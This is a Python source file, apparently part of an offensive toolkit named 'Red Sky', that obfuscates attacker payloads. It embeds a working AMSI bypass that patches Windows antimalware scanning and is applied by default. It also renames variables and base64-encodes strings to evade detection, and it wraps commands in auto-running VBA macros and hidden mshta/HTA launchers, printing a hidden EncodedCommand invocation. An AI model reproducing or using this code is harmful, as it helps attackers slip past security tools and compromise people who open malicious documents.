# language: Python, file: Program/payload/obfuscator.py, target: Red Sky payload — obfuscator
# Obfuscate PowerShell / VBA / JS. Includes AMSI-bypass prelude options.

import base64
import random
import sys
from pathlib import Path
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


AMSI_BYPASS_PRELUDE = r'''
# AMSI bypass via reflection — patches AmsiScanBuffer to always return clean
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields("NonPublic,Static");ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
'''


def _ps_base64(script: str) -> str:
    """Encode PowerShell as UTF-16LE base64 — runs via -EncodedCommand."""
    return base64.b64encode(script.encode("utf-16-le")).decode()


def _ps_var_shuffle(script: str) -> str:
    """Rename variables to random short names."""
    import re
    vars_found = set(re.findall(r"\$([a-zA-Z_][a-zA-Z0-9_]*)", script))
    replacements = {}
    for v in vars_found:
        if len(v) <= 2:
            continue
        new = "$" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=6))
        replacements[f"${v}"] = new
    for old, new in replacements.items():
        script = script.replace(old, new)
    return script


def _ps_string_encrypt(script: str) -> str:
    """Wrap every literal string in a decode function call."""
    import re
    strings = re.findall(r'"([^"]*)"', script)
    for s in strings:
        if not s:
            continue
        enc = base64.b64encode(s.encode()).decode()
        script = script.replace(f'"{s}"', f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{enc}"))')
    return script


def obfuscate_ps(script: str, method: str = "base64", amsi: bool = True) -> str:
    if amsi:
        script = AMSI_BYPASS_PRELUDE + "\n" + script

    if method == "base64":
        return script, _ps_base64(script)
    if method == "shuffle":
        return _ps_var_shuffle(script), script
    if method == "strings":
        return script, _ps_string_encrypt(script)
    if method == "all":
        script = _ps_var_shuffle(script)
        script = _ps_string_encrypt(script)
        return script, _ps_base64(script)
    return script, script


def _vba_wrap(payload: str) -> str:
    """Wrap a shell command as a VBA macro."""
    escaped = payload.replace('"', '""')
    return f'''Sub AutoOpen()
    Dim cmd As String
    cmd = "cmd.exe /c {escaped}"
    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub

Sub Document_Open()
    AutoOpen
End Sub
'''


def _js_wrap(payload: str) -> str:
    """Wrap as JS for mshta / HTA."""
    return f'''<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe /c {payload}", 0, false);
window.close();
</script>
'''


def cmd_gen(target: str, method: str, payload: str, amsi: bool, out_file: str) -> int:
    target = target.lower()
    print_info(f"obfuscating {target} script")
    print_kv("method", method)
    print_kv("amsi", amsi)
    print()

    if target == "ps" or target == "powershell":
        plain, final = obfuscate_ps(payload, method, amsi)
        print(f"{ARTERY}{BOLD}── PowerShell obfuscated{RESET}")
        print(final[:2000])
        print()
        print_info("run with:")
        print(f"  {ASH}powershell -NoP -W Hidden -EncodedCommand {final[:80]}…{RESET}")
        result = final

    elif target == "vba":
        result = _vba_wrap(payload)
        print(f"{ARTERY}{BOLD}── VBA macro{RESET}")
        print(result)

    elif target == "js" or target == "hta":
        result = _js_wrap(payload)
        print(f"{ARTERY}{BOLD}── JS / HTA{RESET}")
        print(result)

    else:
        print_err(f"unknown target: {target}")
        print_info("available: ps | vba | js | hta")
        return 2

    if out_file:
        out = Path(out_file)
    else:
        out = OUTPUT_DIR / "payload" / f"obf_{target}_{method}.txt"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(result)
    print()
    print_kv("saved", out)
    return 0


def run_cli(args: List[str]) -> int:
    import argparse
    p = argparse.ArgumentParser(prog="redsky payload obfuscate", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("--target", choices=["ps", "powershell", "vba", "js", "hta"], required=False)
    p.add_argument("--method", default="base64", choices=["base64", "shuffle", "strings", "all"])
    p.add_argument("--payload", required=False)
    p.add_argument("--payload-file", default="")
    p.add_argument("--no-amsi", action="store_true")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky payload obfuscate --target ps|vba|js --payload <text> [--method base64|shuffle|strings|all]")
        return 2

    if ns.help:
        print_info("redsky payload obfuscate --target <ps|vba|js|hta> --payload <text>")
        print_info("  --method base64|shuffle|strings|all")
        print_info("  --payload-file <path>       read payload from file")
        print_info("  --no-amsi                   skip AMSI bypass prelude")
        return 0

    payload = ns.payload or ""
    if ns.payload_file:
        payload = Path(ns.payload_file).read_text()
    if not payload:
        print_err("--payload or --payload-file required")
        return 2

    return cmd_gen(ns.target or "ps", ns.method, payload, not ns.no_amsi, ns.out)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
